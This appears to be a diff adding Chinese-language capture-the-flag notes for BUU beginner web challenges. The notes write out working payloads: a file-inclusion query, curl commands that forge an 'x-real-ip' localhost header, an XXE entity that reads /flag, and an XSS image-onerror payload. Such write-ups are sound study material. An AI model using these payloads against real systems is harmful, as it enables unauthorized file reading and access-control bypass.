@@ -1,0 +1,49 @@
+LFI:
+	描述:启动靶机,看到源码有:include $_GET["file"];文件包含漏洞
+	思路:地址后输入 ?file=/flag
+
+SQL COURSE:
+	描述:页面sql注入,F12查看,发现请求路径有类似http://xxx.xx?id=1
+	思路:参考2SQL.md
+
+Upload_Labs:
+	参考:4Upload_Labs.md
+
+sqli-labs:
+	参考:7sqli-labs.md
+
+buu burp course1:
+	描述: 服务器限制本地访问
+	思路: 请求时伪造头部 => x-real-ip:127.0.0.1
+	答案: 使用工具拦截请求,或者 curl:
+	1. curl -H "x-real-ip:127.0.0.1"  http://xxx.xx/	#伪造本地请求
+	2. curl -H "x-real-ip:127.0.0.1" -d "username=admin&password=xxx" http://xxx.xx/
+
+BUU XXE COURSE 1:
+	描述: XXE (XML外部实体注入) , F12查看,post表单提交的数据时一个xml结构
+	思路: 未禁用外部实体,构造恶意payload,读取服务器文件:
+	#服务器解析 XML 时会读取 /flag 文件内容并将其替换到 &admin
+	?xml version="1.0" encoding="UTF-8"?>
+	<!DOCTYPE root [
+    		<!ENTITY admin SYSTEM "file:///flag">
+	]>
+	<root>
+    		<username>&admin;</username>
+    		<password>123456</password>
+	</root>
+
+BUU XSS COURSE 1:
+	描述: xss攻击, 页面过滤了<script>, 使用<img src=x onerror=alert(1)>触发
+	相关xss笔记参考 xss.md
+
+
+
+
+
+
+
+
+
+
+
+	
